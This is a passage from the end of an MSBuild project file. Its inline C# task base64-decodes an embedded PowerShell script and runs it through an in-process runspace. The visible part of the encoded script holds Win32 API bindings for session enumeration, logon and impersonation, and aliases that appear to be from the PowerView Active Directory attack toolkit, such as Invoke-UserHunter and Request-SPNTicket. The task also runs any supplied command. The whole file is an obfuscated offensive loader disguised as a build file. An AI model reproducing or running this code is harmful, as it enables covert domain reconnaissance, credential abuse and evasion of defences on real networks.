WQgPSBmaWVsZCA2IEludFB0cgogICAgRG9tYWluR3VpZCA9IGZpZWxkIDcgR3VpZAp9CgojIHVzZWQgYnkgV05ldEFkZENvbm5lY3Rpb24yVwokTkVUUkVTT1VSQ0VXID0gc3RydWN0ICRNb2QgTkVUUkVTT1VSQ0VXIEB7CiAgICBkd1Njb3BlID0gICAgICAgICBmaWVsZCAwIFVJbnQzMgogICAgZHdUeXBlID0gICAgICAgICAgZmllbGQgMSBVSW50MzIKICAgIGR3RGlzcGxheVR5cGUgPSAgIGZpZWxkIDIgVUludDMyCiAgICBkd1VzYWdlID0gICAgICAgICBmaWVsZCAzIFVJbnQzMgogICAgbHBMb2NhbE5hbWUgPSAgICAgZmllbGQgNCBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgbHBSZW1vdGVOYW1lID0gICAgZmllbGQgNSBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgbHBDb21tZW50ID0gICAgICAgZmllbGQgNiBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQogICAgbHBQcm92aWRlciA9ICAgICAgZmllbGQgNyBTdHJpbmcgLU1hcnNoYWxBcyBAKCdMUFdTdHInKQp9CgojIGFsbCBvZiB0aGUgV2luMzIgQVBJIGZ1bmN0aW9ucyB3ZSBuZWVkCiRGdW5jdGlvbkRlZmluaXRpb25zID0gQCgKICAgIChmdW5jIG5ldGFwaTMyIE5ldFNoYXJlRW51bSAoW0ludF0pIEAoW1N0cmluZ10sIFtJbnRdLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnRdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBOZXRXa3N0YVVzZXJFbnVtIChbSW50XSkgQChbU3RyaW5nXSwgW0ludF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludF0sIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpKSwKICAgIChmdW5jIG5ldGFwaTMyIE5ldFNlc3Npb25FbnVtIChbSW50XSkgQChbU3RyaW5nXSwgW1N0cmluZ10sIFtTdHJpbmddLCBbSW50XSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50XSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkpLAogICAgKGZ1bmMgbmV0YXBpMzIgTmV0TG9jYWxHcm91cEVudW0gKFtJbnRdKSBAKFtTdHJpbmddLCBbSW50XSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50XSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCksIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkpLAogICAgKGZ1bmMgbmV0YXBpMzIgTmV0TG9jYWxHcm91cEdldE1lbWJlcnMgKFtJbnRdKSBAKFtTdHJpbmddLCBbU3RyaW5nXSwgW0ludF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludF0sIFtJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpKSwKICAgIChmdW5jIG5ldGFwaTMyIERzR2V0U2l0ZU5hbWUgKFtJbnRdKSBAKFtTdHJpbmddLCBbSW50UHRyXS5NYWtlQnlSZWZUeXBlKCkpKSwKICAgIChmdW5jIG5ldGFwaTMyIERzRW51bWVyYXRlRG9tYWluVHJ1c3RzIChbSW50XSkgQChbU3RyaW5nXSwgW1VJbnQzMl0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSksCiAgICAoZnVuYyBuZXRhcGkzMiBOZXRBcGlCdWZmZXJGcmVlIChbSW50XSkgQChbSW50UHRyXSkpLAogICAgKGZ1bmMgYWR2YXBpMzIgQ29udmVydFNpZFRvU3RyaW5nU2lkIChbSW50XSkgQChbSW50UHRyXSwgW1N0cmluZ10uTWFrZUJ5UmVmVHlwZSgpKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIGFkdmFwaTMyIE9wZW5TQ01hbmFnZXJXIChbSW50UHRyXSkgQChbU3RyaW5nXSwgW1N0cmluZ10sIFtJbnRdKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIGFkdmFwaTMyIENsb3NlU2VydmljZUhhbmRsZSAoW0ludF0pIEAoW0ludFB0cl0pKSwKICAgIChmdW5jIGFkdmFwaTMyIExvZ29uVXNlciAoW0Jvb2xdKSBAKFtTdHJpbmddLCBbU3RyaW5nXSwgW1N0cmluZ10sIFtVSW50MzJdLCBbVUludDMyXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIGFkdmFwaTMyIEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyIChbQm9vbF0pIEAoW0ludFB0cl0pIC1TZXRMYXN0RXJyb3IpLAogICAgKGZ1bmMgYWR2YXBpMzIgUmV2ZXJ0VG9TZWxmIChbQm9vbF0pIEAoKSAtU2V0TGFzdEVycm9yKSwKICAgIChmdW5jIHd0c2FwaTMyIFdUU09wZW5TZXJ2ZXJFeCAoW0ludFB0cl0pIEAoW1N0cmluZ10pKSwKICAgIChmdW5jIHd0c2FwaTMyIFdUU0VudW1lcmF0ZVNlc3Npb25zRXggKFtJbnRdKSBAKFtJbnRQdHJdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpIC1TZXRMYXN0RXJyb3IpLAogICAgKGZ1bmMgd3RzYXBpMzIgV1RTUXVlcnlTZXNzaW9uSW5mb3JtYXRpb24gKFtJbnRdKSBAKFtJbnRQdHJdLCBbSW50XSwgW0ludF0sIFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW0ludDMyXS5NYWtlQnlSZWZUeXBlKCkpIC1TZXRMYXN0RXJyb3IpLAogICAgKGZ1bmMgd3RzYXBpMzIgV1RTRnJlZU1lbW9yeUV4IChbSW50XSkgQChbSW50MzJdLCBbSW50UHRyXSwgW0ludDMyXSkpLAogICAgKGZ1bmMgd3RzYXBpMzIgV1RTRnJlZU1lbW9yeSAoW0ludF0pIEAoW0ludFB0cl0pKSwKICAgIChmdW5jIHd0c2FwaTMyIFdUU0Nsb3NlU2VydmVyIChbSW50XSkgQChbSW50UHRyXSkpLAogICAgKGZ1bmMgTXByIFdOZXRBZGRDb25uZWN0aW9uMlcgKFtJbnRdKSBAKCRORVRSRVNPVVJDRVcsIFtTdHJpbmddLCBbU3RyaW5nXSwgW1VJbnQzMl0pKSwKICAgIChmdW5jIE1wciBXTmV0Q2FuY2VsQ29ubmVjdGlvbjIgKFtJbnRdKSBAKFtTdHJpbmddLCBbSW50XSwgW0Jvb2xdKSksCiAgICAoZnVuYyBrZXJuZWwzMiBDbG9zZUhhbmRsZSAoW0Jvb2xdKSBAKFtJbnRQdHJdKSAtU2V0TGFzdEVycm9yKQopCgokVHlwZXMgPSAkRnVuY3Rpb25EZWZpbml0aW9ucyB8IEFkZC1XaW4zMlR5cGUgLU1vZHVsZSAkTW9kIC1OYW1lc3BhY2UgJ1dpbjMyJwokTmV0YXBpMzIgPSAkVHlwZXNbJ25ldGFwaTMyJ10KJEFkdmFwaTMyID0gJFR5cGVzWydhZHZhcGkzMiddCiRXdHNhcGkzMiA9ICRUeXBlc1snd3RzYXBpMzInXQokTXByID0gJFR5cGVzWydNcHInXQokS2VybmVsMzIgPSAkVHlwZXNbJ2tlcm5lbDMyJ10KClNldC1BbGlhcyBHZXQtSVBBZGRyZXNzIFJlc29sdmUtSVBBZGRyZXNzClNldC1BbGlhcyBDb252ZXJ0LU5hbWVUb1NpZCBDb252ZXJ0VG8tU0lEClNldC1BbGlhcyBDb252ZXJ0LVNpZFRvTmFtZSBDb252ZXJ0RnJvbS1TSUQKU2V0LUFsaWFzIFJlcXVlc3QtU1BOVGlja2V0IEdldC1Eb21haW5TUE5UaWNrZXQKU2V0LUFsaWFzIEdldC1ETlNab25lIEdldC1Eb21haW5ETlNab25lClNldC1BbGlhcyBHZXQtRE5TUmVjb3JkIEdldC1Eb21haW5ETlNSZWNvcmQKU2V0LUFsaWFzIEdldC1OZXREb21haW4gR2V0LURvbWFpbgpTZXQtQWxpYXMgR2V0LU5ldERvbWFpbkNvbnRyb2xsZXIgR2V0LURvbWFpbkNvbnRyb2xsZXIKU2V0LUFsaWFzIEdldC1OZXRGb3Jlc3QgR2V0LUZvcmVzdApTZXQtQWxpYXMgR2V0LU5ldEZvcmVzdERvbWFpbiBHZXQtRm9yZXN0RG9tYWluClNldC1BbGlhcyBHZXQtTmV0Rm9yZXN0Q2F0YWxvZyBHZXQtRm9yZXN0R2xvYmFsQ2F0YWxvZwpTZXQtQWxpYXMgR2V0LU5ldFVzZXIgR2V0LURvbWFpblVzZXIKU2V0LUFsaWFzIEdldC1Vc2VyRXZlbnQgR2V0LURvbWFpblVzZXJFdmVudApTZXQtQWxpYXMgR2V0LU5ldENvbXB1dGVyIEdldC1Eb21haW5Db21wdXRlcgpTZXQtQWxpYXMgR2V0LUFET2JqZWN0IEdldC1Eb21haW5PYmplY3QKU2V0LUFsaWFzIFNldC1BRE9iamVjdCBTZXQtRG9tYWluT2JqZWN0ClNldC1BbGlhcyBHZXQtT2JqZWN0QWNsIEdldC1Eb21haW5PYmplY3RBY2wKU2V0LUFsaWFzIEFkZC1PYmplY3RBY2wgQWRkLURvbWFpbk9iamVjdEFjbApTZXQtQWxpYXMgSW52b2tlLUFDTFNjYW5uZXIgRmluZC1JbnRlcmVzdGluZ0RvbWFpbkFjbApTZXQtQWxpYXMgR2V0LUdVSURNYXAgR2V0LURvbWFpbkdVSURNYXAKU2V0LUFsaWFzIEdldC1OZXRPVSBHZXQtRG9tYWluT1UKU2V0LUFsaWFzIEdldC1OZXRTaXRlIEdldC1Eb21haW5TaXRlClNldC1BbGlhcyBHZXQtTmV0U3VibmV0IEdldC1Eb21haW5TdWJuZXQKU2V0LUFsaWFzIEdldC1OZXRHcm91cCBHZXQtRG9tYWluR3JvdXAKU2V0LUFsaWFzIEZpbmQtTWFuYWdlZFNlY3VyaXR5R3JvdXBzIEdldC1Eb21haW5NYW5hZ2VkU2VjdXJpdHlHcm91cApTZXQtQWxpYXMgR2V0LU5ldEdyb3VwTWVtYmVyIEdldC1Eb21haW5Hcm91cE1lbWJlcgpTZXQtQWxpYXMgR2V0LU5ldEZpbGVTZXJ2ZXIgR2V0LURvbWFpbkZpbGVTZXJ2ZXIKU2V0LUFsaWFzIEdldC1ERlNzaGFyZSBHZXQtRG9tYWluREZTU2hhcmUKU2V0LUFsaWFzIEdldC1OZXRHUE8gR2V0LURvbWFpbkdQTwpTZXQtQWxpYXMgR2V0LU5ldEdQT0dyb3VwIEdldC1Eb21haW5HUE9Mb2NhbEdyb3VwClNldC1BbGlhcyBGaW5kLUdQT0xvY2F0aW9uIEdldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmcKU2V0LUFsaWFzIEZpbmQtR1BPQ29tcHV0ZXJBZG1pbiBHZXQtRG9tYWluR1BPQ29tcHV0ZXJMb2NhbEdyb3VwTWFwcGluClNldC1BbGlhcyBHZXQtTG9nZ2VkT25Mb2NhbCBHZXQtUmVnTG9nZ2VkT24KU2V0LUFsaWFzIEludm9rZS1DaGVja0xvY2FsQWRtaW5BY2Nlc3MgVGVzdC1BZG1pbkFjY2VzcwpTZXQtQWxpYXMgR2V0LVNpdGVOYW1lIEdldC1OZXRDb21wdXRlclNpdGVOYW1lClNldC1BbGlhcyBHZXQtUHJveHkgR2V0LVdNSVJlZ1Byb3h5ClNldC1BbGlhcyBHZXQtTGFzdExvZ2dlZE9uIEdldC1XTUlSZWdMYXN0TG9nZ2VkT24KU2V0LUFsaWFzIEdldC1DYWNoZWRSRFBDb25uZWN0aW9uIEdldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uClNldC1BbGlhcyBHZXQtUmVnaXN0cnlNb3VudGVkRHJpdmUgR2V0LVdNSVJlZ01vdW50ZWREcml2ZQpTZXQtQWxpYXMgR2V0LU5ldFByb2Nlc3MgR2V0LVdNSVByb2Nlc3MKU2V0LUFsaWFzIEludm9rZS1UaHJlYWRlZEZ1bmN0aW9uIE5ldy1UaHJlYWRlZEZ1bmN0aW9uClNldC1BbGlhcyBJbnZva2UtVXNlckh1bnRlciBGaW5kLURvbWFpblVzZXJMb2NhdGlvbgpTZXQtQWxpYXMgSW52b2tlLVByb2Nlc3NIdW50ZXIgRmluZC1Eb21haW5Qcm9jZXNzClNldC1BbGlhcyBJbnZva2UtRXZlbnRIdW50ZXIgRmluZC1Eb21haW5Vc2VyRXZlbnQKU2V0LUFsaWFzIEludm9rZS1TaGFyZUZpbmRlciBGaW5kLURvbWFpblNoYXJlClNldC1BbGlhcyBJbnZva2UtRmlsZUZpbmRlciBGaW5kLUludGVyZXN0aW5nRG9tYWluU2hhcmVGaWxlClNldC1BbGlhcyBJbnZva2UtRW51bWVyYXRlTG9jYWxBZG1pbiBGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXIKU2V0LUFsaWFzIEdldC1OZXREb21haW5UcnVzdCBHZXQtRG9tYWluVHJ1c3QKU2V0LUFsaWFzIEdldC1OZXRGb3Jlc3RUcnVzdCBHZXQtRm9yZXN0VHJ1c3QKU2V0LUFsaWFzIEZpbmQtRm9yZWlnblVzZXIgR2V0LURvbWFpbkZvcmVpZ25Vc2VyClNldC1BbGlhcyBGaW5kLUZvcmVpZ25Hcm91cCBHZXQtRG9tYWluRm9yZWlnbkdyb3VwTWVtYmVyClNldC1BbGlhcyBJbnZva2UtTWFwRG9tYWluVHJ1c3QgR2V0LURvbWFpblRydXN0TWFwcGluZwo="; string x = ""; if (funcName != "None") { byte[] data = Convert.FromBase64String(encScript); string command = Encoding.ASCII.GetString(data); x = command + "\n" + funcName; } else if (Cmd != "None") { x = Cmd; } else { return true; } try { Console.Write(RunPSCommand(x)); } catch (Exception e) { Console.Write(e.Message); } return true; } public static string RunPSCommand(string cmd) { Runspace runspace = RunspaceFactory.CreateRunspace(); runspace.Open(); RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace); Pipeline pipeline = runspace.CreatePipeline(); pipeline.Commands.AddScript(cmd); pipeline.Commands.Add("Out-String"); Collection<PSObject> results = pipeline.Invoke(); runspace.Close(); StringBuilder stringBuilder = new StringBuilder(); foreach (PSObject obj in results) { stringBuilder.Append(obj); } return stringBuilder.ToString().Trim(); } public static void RunPSFile(string script) { PowerShell ps = PowerShell.Create(); ps.AddScript(script).Invoke(); } } ]]> </Code>
			</Task>
		</UsingTask>
	</Project>
